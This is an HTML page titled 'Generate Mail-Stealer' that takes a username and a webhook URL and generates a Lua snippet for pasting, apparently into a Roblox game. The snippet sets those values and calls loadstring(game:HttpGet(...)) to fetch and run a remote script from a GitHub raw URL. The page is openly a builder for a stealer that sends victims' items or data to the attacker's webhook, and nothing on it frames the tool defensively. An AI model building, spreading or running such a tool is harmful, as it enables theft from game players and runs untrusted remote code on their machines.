<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Coen On Top</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
<style>
  body { font-family: Arial, sans-serif; background-color: #7bc26b; text-align: center; padding: 50px; }
  .container { background-color: rgb(86, 135, 37); padding: 20px; border-radius: 8px; display: inline-block; }
  .input-field, .checkbox-group, button { margin: 10px 0; }
  button { padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
  button:hover { background-color: #0056b3; }
  #output { text-align: left; white-space: pre-wrap; }
  textarea { width: 100%; height: 150px; }
</style>
</head>
<body>
  <div class="container">
  <h1>Generate Mail-Stealer</h1>
    <div class="input-field">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username">
    </div>
    <div class="input-field">
      <label for="webhook">Webhook URL:</label>
      <input type="text" id="webhook" name="webhook">
    </div>
    <button onclick="generateOutput()">Generate</button>
    <textarea id="output"></textarea>
    <button onclick="copyToClipboard()">Copy to Clipboard</button>
  </div>

<script>
    function generateOutput() {
        var username = document.getElementById("username").value;
        var webhook = document.getElementById("webhook").value;
        var outputString = 'Username = "' + username + '"\n' + // Use actual line breaks
                           'Webhook = "' + webhook + '"\n' +
                           'loadstring(game:HttpGet("https://raw.githubusercontent.com/Petsim99x/PS99ScriptHub/main/script"))()';
        document.getElementById("output").value = outputString;
        hljs.highlightAll();
    }

    function copyToClipboard() {
        var copyText = document.getElementById("output");
        copyText.select();
        document.execCommand("copy");
    }
</script>

</body>
</html>
